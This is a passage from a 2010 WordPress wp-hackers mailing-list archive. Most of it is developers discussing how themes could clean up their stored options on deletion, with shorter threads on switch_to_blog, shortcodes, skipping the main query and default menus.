> >> Sent from my BlackBerry? smartphone on 3
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> Davit Barbakadze
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Fri Jul 30 13:45:12 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Fri, 30 Jul 2010 09:45:12 -0400
Subject: [wp-hackers] any way to clean after theme when it gets deleted?
In-Reply-To: <AANLkTikU0qcxQMMVgRwTrNOEHjXoUO_o0r44C+=_96Z+@mail.gmail.com>
References: <1392738174-1280488446-cardhu_decombobulator_blackberry.rim.net-16166662-@bda007.bisx.prodap.on.blackberry>
	<AANLkTimqn9O=T4Cjg5CHcbZaHzKgstxH2VO+Pw-Kf9zA@mail.gmail.com> 
	<AANLkTikhpSNdc-VtaLnOU2py=b+90tFjpCFLZeW+ecS6@mail.gmail.com> 
	<AANLkTikU0qcxQMMVgRwTrNOEHjXoUO_o0r44C+=_96Z+@mail.gmail.com>
Message-ID: <AANLkTi=ua3FWx5UJnGs9TpxYbqk_dN_GhW_bxbas01ON@mail.gmail.com>

On Fri, Jul 30, 2010 at 9:25 AM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> You didn't get my point. I said you should provide an uninstaller function
> that wipes out data and it shouldn't be automated upon deactivation.
>

Not sure you got his point -- I believe Davit is referring to the
implementation of an uninstall hook for themes. He's pretty clear he'd want
that triggered on deletion, not deactivation. Basically, how it works for
plugins.

I think implementing themes uninstall hooks would be a logical future step.
We could start by removing items created using the theme_mod functions,
which I don't think most themes use, but we use it for storing metadata for
custom backgrounds and headers.

From ashishsainiashfame at gmail.com  Fri Jul 30 14:18:22 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Fri, 30 Jul 2010 19:48:22 +0530
Subject: [wp-hackers] any way to clean after theme when it gets deleted?
In-Reply-To: <AANLkTi=ua3FWx5UJnGs9TpxYbqk_dN_GhW_bxbas01ON@mail.gmail.com>
References: <1392738174-1280488446-cardhu_decombobulator_blackberry.rim.net-16166662-@bda007.bisx.prodap.on.blackberry>
	<AANLkTimqn9O=T4Cjg5CHcbZaHzKgstxH2VO+Pw-Kf9zA@mail.gmail.com> 
	<AANLkTikhpSNdc-VtaLnOU2py=b+90tFjpCFLZeW+ecS6@mail.gmail.com> 
	<AANLkTikU0qcxQMMVgRwTrNOEHjXoUO_o0r44C+=_96Z+@mail.gmail.com> 
	<AANLkTi=ua3FWx5UJnGs9TpxYbqk_dN_GhW_bxbas01ON@mail.gmail.com>
Message-ID: <AANLkTim7MQR2P6yOUa0j1TiPfWiaXDrVXfJM94Xovm-v@mail.gmail.com>

Andrew, I knew that. I just replied back with a possible solution for his
case.

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Fri, Jul 30, 2010 at 7:15 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Fri, Jul 30, 2010 at 9:25 AM, Ashish Saini
> <ashishsainiashfame at gmail.com>wrote:
>
> > You didn't get my point. I said you should provide an uninstaller
> function
> > that wipes out data and it shouldn't be automated upon deactivation.
> >
>
> Not sure you got his point -- I believe Davit is referring to the
> implementation of an uninstall hook for themes. He's pretty clear he'd want
> that triggered on deletion, not deactivation. Basically, how it works for
> plugins.
>
> I think implementing themes uninstall hooks would be a logical future step.
> We could start by removing items created using the theme_mod functions,
> which I don't think most themes use, but we use it for storing metadata for
> custom backgrounds and headers.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jayarjo at gmail.com  Fri Jul 30 14:32:12 2010
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Fri, 30 Jul 2010 18:32:12 +0400
Subject: [wp-hackers] any way to clean after theme when it gets deleted?
In-Reply-To: <AANLkTi=ua3FWx5UJnGs9TpxYbqk_dN_GhW_bxbas01ON@mail.gmail.com>
References: <1392738174-1280488446-cardhu_decombobulator_blackberry.rim.net-16166662-@bda007.bisx.prodap.on.blackberry>
	<AANLkTimqn9O=T4Cjg5CHcbZaHzKgstxH2VO+Pw-Kf9zA@mail.gmail.com> 
	<AANLkTikhpSNdc-VtaLnOU2py=b+90tFjpCFLZeW+ecS6@mail.gmail.com> 
	<AANLkTikU0qcxQMMVgRwTrNOEHjXoUO_o0r44C+=_96Z+@mail.gmail.com> 
	<AANLkTi=ua3FWx5UJnGs9TpxYbqk_dN_GhW_bxbas01ON@mail.gmail.com>
Message-ID: <AANLkTi=KdyyghUgN0-U46rkDThdGaYGmR1SH8c5F+w09@mail.gmail.com>

theme_mod functions? what do they do?

On Fri, Jul 30, 2010 at 5:45 PM, Andrew Nacin <wp at andrewnacin.com> wrote:
> On Fri, Jul 30, 2010 at 9:25 AM, Ashish Saini
> <ashishsainiashfame at gmail.com>wrote:
>
>> You didn't get my point. I said you should provide an uninstaller function
>> that wipes out data and it shouldn't be automated upon deactivation.
>>
>
> Not sure you got his point -- I believe Davit is referring to the
> implementation of an uninstall hook for themes. He's pretty clear he'd want
> that triggered on deletion, not deactivation. Basically, how it works for
> plugins.
>
> I think implementing themes uninstall hooks would be a logical future step.
> We could start by removing items created using the theme_mod functions,
> which I don't think most themes use, but we use it for storing metadata for
> custom backgrounds and headers.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From wp at andrewnacin.com  Fri Jul 30 14:38:48 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Fri, 30 Jul 2010 10:38:48 -0400
Subject: [wp-hackers] any way to clean after theme when it gets deleted?
In-Reply-To: <AANLkTi=KdyyghUgN0-U46rkDThdGaYGmR1SH8c5F+w09@mail.gmail.com>
References: <1392738174-1280488446-cardhu_decombobulator_blackberry.rim.net-16166662-@bda007.bisx.prodap.on.blackberry>
	<AANLkTimqn9O=T4Cjg5CHcbZaHzKgstxH2VO+Pw-Kf9zA@mail.gmail.com> 
	<AANLkTikhpSNdc-VtaLnOU2py=b+90tFjpCFLZeW+ecS6@mail.gmail.com> 
	<AANLkTikU0qcxQMMVgRwTrNOEHjXoUO_o0r44C+=_96Z+@mail.gmail.com> 
	<AANLkTi=ua3FWx5UJnGs9TpxYbqk_dN_GhW_bxbas01ON@mail.gmail.com> 
	<AANLkTi=KdyyghUgN0-U46rkDThdGaYGmR1SH8c5F+w09@mail.gmail.com>
Message-ID: <AANLkTinDDOQTQyaZdnmazoiGn6HSGXVW9eLkffXm0HZw@mail.gmail.com>

On Fri, Jul 30, 2010 at 10:32 AM, Davit Barbakadze <jayarjo at gmail.com>wrote:

> theme_mod functions? what do they do?


Rudimentary options storage for themes. Each theme's mods are stored in a
single DB option row in the form of mod_{$theme}.

Locations in core:
./wp-includes/theme.php:1270:function get_theme_mod($name, $default = false)
{
./wp-includes/theme.php:1289:function set_theme_mod($name, $value) {
./wp-includes/theme.php:1311:function remove_theme_mod( $name ) {
./wp-includes/theme.php:1333:function remove_theme_mods() {

Codex pages:
http://codex.wordpress.org/Function_Reference/get_theme_mod
http://codex.wordpress.org/Function_Reference/set_theme_mod
http://codex.wordpress.org/Function_Reference/remove_theme_mod
http://codex.wordpress.org/Function_Reference/remove_theme_mods

From dennen at gmail.com  Fri Jul 30 15:29:11 2010
From: dennen at gmail.com (Bill Dennen)
Date: Fri, 30 Jul 2010 11:29:11 -0400
Subject: [wp-hackers] switch_to_blog in WP3
Message-ID: <AANLkTimgcjBN35jVm7+Q_9CsGcuJJdhL9E-vjWTCLfe3@mail.gmail.com>

Hi,

I wrote a plugin that allows one blog to pull posts in from another
blog via shortcode. I call it get-news. The syntax of the shortcode is
something like this:

[get-news site_name="news" numberposts="10" show_dates="0"]

In short, what this code does is switch to the blog located at /news/
and grab the 10 most recent posts and display them on the current
blog. There are other options, as well - like pulling posts by
category or tags, showing thumbnails, etc.

My code uses switch_to_blog to do this. I've read that this function
has a heavy performance hit. But, we've been using it with WP Super
Cache and it has worked well for us in WPMU 2.9.2. Plus, at this
point, my plugin is not meant for distribution -- it's used only on
the site I manage. (That could change...)

Now, my code is broken in WP3.x. Permalinks are incorrect and
thumbnails do not work properly.

I believe it's this bug, which is now listed as a "wontfix":

http://core.trac.wordpress.org/ticket/12040

In the bug report, there is mention that this bug could be 'fixed' via
a plugin via the switch_blog hook.

I'm looking for alternate suggestions for ways to do this. At this
point, this bug is holding us back from going with WP3, which we'd
like to do for many reasons!

One option I toyed with initially was using RSS feeds, but I could not
get the thumbnails over that way.

Looking forward to any suggestions.

Thanks-
Bill

From esmi at quirm.net  Fri Jul 30 15:33:08 2010
From: esmi at quirm.net (esmi at quirm dot net)
Date: Fri, 30 Jul 2010 16:33:08 +0100
Subject: [wp-hackers] any way to clean after theme when it gets deleted?
In-Reply-To: <AANLkTinDDOQTQyaZdnmazoiGn6HSGXVW9eLkffXm0HZw@mail.gmail.com>
References: <1392738174-1280488446-cardhu_decombobulator_blackberry.rim.net-16166662-@bda007.bisx.prodap.on.blackberry>	<AANLkTimqn9O=T4Cjg5CHcbZaHzKgstxH2VO+Pw-Kf9zA@mail.gmail.com>
	<AANLkTikhpSNdc-VtaLnOU2py=b+90tFjpCFLZeW+ecS6@mail.gmail.com>
	<AANLkTikU0qcxQMMVgRwTrNOEHjXoUO_o0r44C+=_96Z+@mail.gmail.com>
	<AANLkTi=ua3FWx5UJnGs9TpxYbqk_dN_GhW_bxbas01ON@mail.gmail.com>
	<AANLkTi=KdyyghUgN0-U46rkDThdGaYGmR1SH8c5F+w09@mail.gmail.com>
	<AANLkTinDDOQTQyaZdnmazoiGn6HSGXVW9eLkffXm0HZw@mail.gmail.com>
Message-ID: <4C52F0B4.4030908@quirm.net>

on 30/07/2010 15:38 Andrew Nacin said the following:
> On Fri, Jul 30, 2010 at 10:32 AM, Davit Barbakadze <jayarjo at gmail.com>wrote:

>> theme_mod functions? what do they do?

> Rudimentary options storage for themes. Each theme's mods are stored in a
> single DB option row in the form of mod_{$theme}.

<snip>

It's the multiple single rows in the db that I'm not keen on. Most of 
the time, I've been using a single row in the options table to store a 
serialized array. Each theme then has a manual "reset" option which 
removes all stored theme options but, thus far, I haven't found a way to 
trigger the reset on theme deletion.

Mel / esmi
-- 
WordPress theme developer
http://quirm.net
http://blackwidows.co.uk

From wp at andrewnacin.com  Fri Jul 30 15:41:58 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Fri, 30 Jul 2010 11:41:58 -0400
Subject: [wp-hackers] any way to clean after theme when it gets deleted?
In-Reply-To: <4C52F0B4.4030908@quirm.net>
References: <1392738174-1280488446-cardhu_decombobulator_blackberry.rim.net-16166662-@bda007.bisx.prodap.on.blackberry>
	<AANLkTimqn9O=T4Cjg5CHcbZaHzKgstxH2VO+Pw-Kf9zA@mail.gmail.com> 
	<AANLkTikhpSNdc-VtaLnOU2py=b+90tFjpCFLZeW+ecS6@mail.gmail.com> 
	<AANLkTikU0qcxQMMVgRwTrNOEHjXoUO_o0r44C+=_96Z+@mail.gmail.com> 
	<AANLkTi=ua3FWx5UJnGs9TpxYbqk_dN_GhW_bxbas01ON@mail.gmail.com> 
	<AANLkTi=KdyyghUgN0-U46rkDThdGaYGmR1SH8c5F+w09@mail.gmail.com> 
	<AANLkTinDDOQTQyaZdnmazoiGn6HSGXVW9eLkffXm0HZw@mail.gmail.com> 
	<4C52F0B4.4030908@quirm.net>
Message-ID: <AANLkTinoMjT4JPwD5+vbO7DahwCMuKXVNEWW4XAc8iQB@mail.gmail.com>

On Fri, Jul 30, 2010 at 11:33 AM, esmi at quirm dot net <esmi at quirm.net>wrote:

> on 30/07/2010 15:38 Andrew Nacin said the following:
>
>  On Fri, Jul 30, 2010 at 10:32 AM, Davit Barbakadze <jayarjo at gmail.com
>> >wrote:
>>
>
>  theme_mod functions? what do they do?
>>>
>>
>  Rudimentary options storage for themes. Each theme's mods are stored in a
>> single DB option row in the form of mod_{$theme}.
>>
>
> <snip>
>
> It's the multiple single rows in the db that I'm not keen on. Most of the
> time, I've been using a single row in the options table to store a
> serialized array. Each theme then has a manual "reset" option which removes
> all stored theme options but, thus far, I haven't found a way to trigger the
> reset on theme deletion.
>

Sorry, to be clear, each theme has a single row which contains all mods for
that theme, serialized. You could use the same technique, coupled with
remove_theme_mods(); however, you wouldn't be able to take advantage of the
settings API out of the box.

From otto at ottodestruct.com  Fri Jul 30 15:59:06 2010
From: otto at ottodestruct.com (Otto)
Date: Fri, 30 Jul 2010 10:59:06 -0500
Subject: [wp-hackers] any way to clean after theme when it gets deleted?
In-Reply-To: <AANLkTikU0qcxQMMVgRwTrNOEHjXoUO_o0r44C+=_96Z+@mail.gmail.com>
References: <1392738174-1280488446-cardhu_decombobulator_blackberry.rim.net-16166662-@bda007.bisx.prodap.on.blackberry>
	<AANLkTimqn9O=T4Cjg5CHcbZaHzKgstxH2VO+Pw-Kf9zA@mail.gmail.com> 
	<AANLkTikhpSNdc-VtaLnOU2py=b+90tFjpCFLZeW+ecS6@mail.gmail.com> 
	<AANLkTikU0qcxQMMVgRwTrNOEHjXoUO_o0r44C+=_96Z+@mail.gmail.com>
Message-ID: <AANLkTi=jvv5QgrwUDWRyAmA_e9HjbbpWf1Qh237nYGNP@mail.gmail.com>

No, I'm with Davit on this one. We do need an uninstall.php file for
themes, just like we have for plugins. This would only get triggered
on theme deletion, not just on switching to another theme. Same as
with plugins.

-Otto



On Fri, Jul 30, 2010 at 8:25 AM, Ashish Saini
<ashishsainiashfame at gmail.com> wrote:
> You didn't get my point. I said you should provide an uninstaller function
> that wipes out data and it shouldn't be automated upon deactivation.
>
> I would hate a theme which will ask for options to be configured again when
> I just switch back to another theme and now I want the previous theme back.
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
> : http://twitter.com/ashfame
>
>
> On Fri, Jul 30, 2010 at 6:47 PM, Davit Barbakadze <jayarjo at gmail.com> wrote:
>
>> It's not about switching (activate/deactivate), but deleting. It would
>> be pretty logical to remove all the stuff that theme has created on
>> activation.
>>
>> On Fri, Jul 30, 2010 at 3:45 PM, Ashish Saini
>> <ashishsainiashfame at gmail.com> wrote:
>> > Hi Davit,
>> >
>> > I think a better option would be to provide uninstall function as leaving
>> > the options in the database makes sense as the user may switch back and
>> so
>> > it will save the pain of configuring it.
>> >
>> > Thanks & Regards
>> > Ashish Saini aka Ashfame
>> > (Deserve Before You Desire)
>> > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>> Twitter
>> > : http://twitter.com/ashfame
>> >
>> >
>> > On Fri, Jul 30, 2010 at 4:44 PM, <diana.j.wiadji at hotmail.com> wrote:
>> >
>> >> $
>> >> ------Original Message------
>> >> From: Davit Barbakadze
>> >> Sender: wp-hackers-bounces at lists.automattic.com
>> >> To: wp-hackers at lists.automattic.com
>> >> ReplyTo: wp-hackers at lists.automattic.com
>> >> Subject: [wp-hackers] ?any way to clean after theme when it gets
>> deleted?
>> >> Sent: Jul 30, 2010 18:02
>> >>
>> >> I think everyone uses options and maybe even tables in their themes
>> >> nowadays. Is there any way coder can clean up after theme - delete
>> >> options, remove tables - when it get's uninstalled. Something similar
>> >> to what we have for plugins?
>> >>
>> >> --
>> >> Davit Barbakadze
>> >> _______________________________________________
>> >> wp-hackers mailing list
>> >> wp-hackers at lists.automattic.com
>> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>
>> >>
>> >>
>> >> Sent from my BlackBerry? smartphone on 3
>> >> _______________________________________________
>> >> wp-hackers mailing list
>> >> wp-hackers at lists.automattic.com
>> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>>
>>
>>
>> --
>> Davit Barbakadze
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jayarjo at gmail.com  Fri Jul 30 17:14:22 2010
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Fri, 30 Jul 2010 21:14:22 +0400
Subject: [wp-hackers] load javascript only for specific custom post_type
	add/edit pages..?
Message-ID: <AANLkTike9sSwqODC+X0C6prtqikRTamgKqqJiZO5zT9M@mail.gmail.com>

Having unexpected difficulties with this. For add new page I check
global variables $typenow and $pagenow. But these seem to be blank for
edit custom post_type page. I've searched the source in affected
files, but can't find anything to hook onto. This should be easy,
right?..

-- 
Davit Barbakadze

From jayarjo at gmail.com  Fri Jul 30 17:17:30 2010
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Fri, 30 Jul 2010 21:17:30 +0400
Subject: [wp-hackers] any way to clean after theme when it gets deleted?
In-Reply-To: <AANLkTi=jvv5QgrwUDWRyAmA_e9HjbbpWf1Qh237nYGNP@mail.gmail.com>
References: <1392738174-1280488446-cardhu_decombobulator_blackberry.rim.net-16166662-@bda007.bisx.prodap.on.blackberry>
	<AANLkTimqn9O=T4Cjg5CHcbZaHzKgstxH2VO+Pw-Kf9zA@mail.gmail.com> 
	<AANLkTikhpSNdc-VtaLnOU2py=b+90tFjpCFLZeW+ecS6@mail.gmail.com> 
	<AANLkTikU0qcxQMMVgRwTrNOEHjXoUO_o0r44C+=_96Z+@mail.gmail.com> 
	<AANLkTi=jvv5QgrwUDWRyAmA_e9HjbbpWf1Qh237nYGNP@mail.gmail.com>
Message-ID: <AANLkTinaC=RMonsT4JEVyTXf824AvPLk8+EBNW-Kd-Yi@mail.gmail.com>

There are some action calls in delete_site_transient function, I think
they can be tricked into triggering of some kind of uninstall
procedure, before anything better enters the core. What do you think?

On Fri, Jul 30, 2010 at 7:59 PM, Otto <otto at ottodestruct.com> wrote:
> No, I'm with Davit on this one. We do need an uninstall.php file for
> themes, just like we have for plugins. This would only get triggered
> on theme deletion, not just on switching to another theme. Same as
> with plugins.
>
> -Otto
>
>
>
> On Fri, Jul 30, 2010 at 8:25 AM, Ashish Saini
> <ashishsainiashfame at gmail.com> wrote:
>> You didn't get my point. I said you should provide an uninstaller function
>> that wipes out data and it shouldn't be automated upon deactivation.
>>
>> I would hate a theme which will ask for options to be configured again when
>> I just switch back to another theme and now I want the previous theme back.
>>
>> Thanks & Regards
>> Ashish Saini aka Ashfame
>> (Deserve Before You Desire)
>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
>> : http://twitter.com/ashfame
>>
>>
>> On Fri, Jul 30, 2010 at 6:47 PM, Davit Barbakadze <jayarjo at gmail.com> wrote:
>>
>>> It's not about switching (activate/deactivate), but deleting. It would
>>> be pretty logical to remove all the stuff that theme has created on
>>> activation.
>>>
>>> On Fri, Jul 30, 2010 at 3:45 PM, Ashish Saini
>>> <ashishsainiashfame at gmail.com> wrote:
>>> > Hi Davit,
>>> >
>>> > I think a better option would be to provide uninstall function as leaving
>>> > the options in the database makes sense as the user may switch back and
>>> so
>>> > it will save the pain of configuring it.
>>> >
>>> > Thanks & Regards
>>> > Ashish Saini aka Ashfame
>>> > (Deserve Before You Desire)
>>> > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter
>>> > : http://twitter.com/ashfame
>>> >
>>> >
>>> > On Fri, Jul 30, 2010 at 4:44 PM, <diana.j.wiadji at hotmail.com> wrote:
>>> >
>>> >> $
>>> >> ------Original Message------
>>> >> From: Davit Barbakadze
>>> >> Sender: wp-hackers-bounces at lists.automattic.com
>>> >> To: wp-hackers at lists.automattic.com
>>> >> ReplyTo: wp-hackers at lists.automattic.com
>>> >> Subject: [wp-hackers] ?any way to clean after theme when it gets
>>> deleted?
>>> >> Sent: Jul 30, 2010 18:02
>>> >>
>>> >> I think everyone uses options and maybe even tables in their themes
>>> >> nowadays. Is there any way coder can clean up after theme - delete
>>> >> options, remove tables - when it get's uninstalled. Something similar
>>> >> to what we have for plugins?
>>> >>
>>> >> --
>>> >> Davit Barbakadze
>>> >> _______________________________________________
>>> >> wp-hackers mailing list
>>> >> wp-hackers at lists.automattic.com
>>> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> >>
>>> >>
>>> >>
>>> >> Sent from my BlackBerry? smartphone on 3
>>> >> _______________________________________________
>>> >> wp-hackers mailing list
>>> >> wp-hackers at lists.automattic.com
>>> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> >>
>>> > _______________________________________________
>>> > wp-hackers mailing list
>>> > wp-hackers at lists.automattic.com
>>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> >
>>>
>>>
>>>
>>> --
>>> Davit Barbakadze
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From louy08 at gmail.com  Fri Jul 30 18:01:51 2010
From: louy08 at gmail.com (Louy Alakkad)
Date: Fri, 30 Jul 2010 21:01:51 +0300
Subject: [wp-hackers] any way to clean after theme when it gets deleted?
In-Reply-To: <AANLkTikbsmp5JJ9bwePbZ_Tgpv8bWj9i1c9OFKNAFdkA@mail.gmail.com>
References: <AANLkTikbsmp5JJ9bwePbZ_Tgpv8bWj9i1c9OFKNAFdkA@mail.gmail.com>
Message-ID: <AANLkTi=+LmXN7rQ2vn7RL3PgpeBZk7w-gwdmmrb1Fm5e@mail.gmail.com>

Hello all :)

well, i have an idea!
in the themes screen, when the user chooses to change the theme, WP asks him
"Do you want to keep theme data?" or anything else. if user clicks yes, we
run some hook "theme_deletion_hook" or action "theme_delete_data". the theme
should have a delete_data function which will be attached to this event/hook
and it would delete the data, we can also add "remove_theme_mods" to that
event.

What do you think?

On Fri, Jul 30, 2010 at 1:02 PM, Davit Barbakadze <jayarjo at gmail.com> wrote:

> I think everyone uses options and maybe even tables in their themes
> nowadays. Is there any way coder can clean up after theme - delete
> options, remove tables - when it get's uninstalled. Something similar
> to what we have for plugins?
>
> --
> Davit Barbakadze
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Louy
http://louyblog.wordpress.com/

From deadowlsurvivor at gmail.com  Fri Jul 30 22:46:01 2010
From: deadowlsurvivor at gmail.com (Jacob Beauregard)
Date: Fri, 30 Jul 2010 18:46:01 -0400
Subject: [wp-hackers] Shortcodes
Message-ID: <AANLkTikYDDNwJ8XUroDb-wBk=DQgdYew0C39Wph0jKjJ@mail.gmail.com>

I created a ticket with a patch:
http://core.trac.wordpress.org/ticket/14481

It ran fine against example-post.txt in 8553.

It would be good to have unit tests for running against the parse tree
and output. I'm not sure the parse tree in this is 100% correct for
opening nodes because names can match a subset of (not-quoted)
literals.

From theodor_ramisch at hotmail.com  Fri Jul 30 22:54:39 2010
From: theodor_ramisch at hotmail.com (Theodor Ramisch)
Date: Sat, 31 Jul 2010 00:54:39 +0200
Subject: [wp-hackers] Skip Main Query
Message-ID: <BLU136-W3251F77E9581669EC5024F90AA0@phx.gbl>


Hi,

I'm writing a plugin which should display data from its own tables in XML. It does not rely on any posts.

To reach my plugin, I've added query_vars, the rewrite rules and listen on template_redirect for the parameters.

No I've noticed that WordPress still queries the posts from the start page. Is there a way to avoid that? Since I don't need the posts, I don't want to make that query.

Bypassing WP completely using mod_rewrite rules is not an option, since I need to have access to the database, permissions and so on.

Thanks,

  Theodor
 		 	   		  

From jaredwilli at gmail.com  Sat Jul 31 00:25:19 2010
From: jaredwilli at gmail.com (Jared Williams)
Date: Fri, 30 Jul 2010 20:25:19 -0400
Subject: [wp-hackers] how can I use the create new menu function for
	making a default menu
Message-ID: <AANLkTimp-wgvQH9C8CHbef9YJboAXe7vc8NCE2iVWq8K@mail.gmail.com>

Hi,
I know the menu system needs lots of work still, but I was wondering if
anyone knows of a way to make use of whatever function(s) the 'Create Menu'
does when you make a new custom named menu in the dashboard to make a
pre-made menu to go along with a registered menu location etc. This would be
nice so that when a theme were installed that has registered menus in it,
the menu name you specify in the code would be created upon installing, and
deleted when uninstalling a theme.

I've searched for some kind of solution to this, and have studied the code
in nav-menus.php and other files with 3.0 source code. This is just about
the only thing I am unable to figure out with 3.0, at least that I have
tried to do so far.
I figured here is probably the best place to ask such a question.

Thanks,

Jared Williams
New2WP.com


On Fri, Jul 30, 2010 at 11:33 AM,
<wp-hackers-request at lists.automattic.com>wrote:

> Send wp-hackers mailing list submissions to
>        wp-hackers at lists.automattic.com
>
> To subscribe or unsubscribe via the World Wide Web, visit
>        http://lists.automattic.com/mailman/listinfo/wp-hackers
> or, via email, send a message with subject or body 'help' to
>        wp-hackers-request at lists.automattic.com
>
> You can reach the person managing the list at
>        wp-hackers-owner at lists.automattic.com
>
> When replying, please edit your Subject line so it is more specific
> than "Re: Contents of wp-hackers digest..."
>
>
> Today's Topics:
>
>   1. Re: any way to clean after theme when it gets deleted?
>      (Davit Barbakadze)
>   2. Re: any way to clean after theme when it gets deleted?
>      (Ashish Saini)
>   3. Re: any way to clean after theme when it gets deleted?
>      (Andrew Nacin)
>   4. Re: any way to clean after theme when it gets deleted?
>      (Ashish Saini)
>   5. Re: any way to clean after theme when it gets deleted?
>      (Davit Barbakadze)
>   6. Re: any way to clean after theme when it gets deleted?
>      (Andrew Nacin)
>   7. switch_to_blog in WP3 (Bill Dennen)
>   8. Re: any way to clean after theme when it gets deleted?
>      (esmi at quirm dot net)
>
>
> ----------------------------------------------------------------------
>
> Message: 1
> Date: Fri, 30 Jul 2010 17:17:51 +0400
> From: Davit Barbakadze <jayarjo at gmail.com>
> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>        deleted?
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTikhpSNdc-VtaLnOU2py=b+90tFjpCFLZeW+ecS6 at mail.gmail.com<b%2B90tFjpCFLZeW%2BecS6 at mail.gmail.com>
> >
> Content-Type: text/plain; charset=ISO-8859-1
>
> It's not about switching (activate/deactivate), but deleting. It would
> be pretty logical to remove all the stuff that theme has created on
> activation.
>
> On Fri, Jul 30, 2010 at 3:45 PM, Ashish Saini
> <ashishsainiashfame at gmail.com> wrote:
> > Hi Davit,
> >
> > I think a better option would be to provide uninstall function as leaving
> > the options in the database makes sense as the user may switch back and
> so
> > it will save the pain of configuring it.
> >
> > Thanks & Regards
> > Ashish Saini aka Ashfame
> > (Deserve Before You Desire)
> > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter
> > : http://twitter.com/ashfame
> >
> >
> > On Fri, Jul 30, 2010 at 4:44 PM, <diana.j.wiadji at hotmail.com> wrote:
> >
> >> $
> >> ------Original Message------
> >> From: Davit Barbakadze
> >> Sender: wp-hackers-bounces at lists.automattic.com
> >> To: wp-hackers at lists.automattic.com
> >> ReplyTo: wp-hackers at lists.automattic.com
> >> Subject: [wp-hackers] ?any way to clean after theme when it gets
> deleted?
> >> Sent: Jul 30, 2010 18:02
> >>
> >> I think everyone uses options and maybe even tables in their themes
> >> nowadays. Is there any way coder can clean up after theme - delete
> >> options, remove tables - when it get's uninstalled. Something similar
> >> to what we have for plugins?
> >>
> >> --
> >> Davit Barbakadze
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >>
> >>
> >> Sent from my BlackBerry? smartphone on 3
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> Davit Barbakadze
>
>
> ------------------------------
>
> Message: 2
> Date: Fri, 30 Jul 2010 18:55:18 +0530
> From: Ashish Saini <ashishsainiashfame at gmail.com>
> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>        deleted?
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTikU0qcxQMMVgRwTrNOEHjXoUO_o0r44C+=_96Z+ at mail.gmail.com<96Z%2B at mail.gmail.com>
> >
> Content-Type: text/plain; charset=ISO-8859-1
>
> You didn't get my point. I said you should provide an uninstaller function
> that wipes out data and it shouldn't be automated upon deactivation.
>
> I would hate a theme which will ask for options to be configured again when
> I just switch back to another theme and now I want the previous theme back.
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter
> : http://twitter.com/ashfame
>
>
> On Fri, Jul 30, 2010 at 6:47 PM, Davit Barbakadze <jayarjo at gmail.com>
> wrote:
>
> > It's not about switching (activate/deactivate), but deleting. It would
> > be pretty logical to remove all the stuff that theme has created on
> > activation.
> >
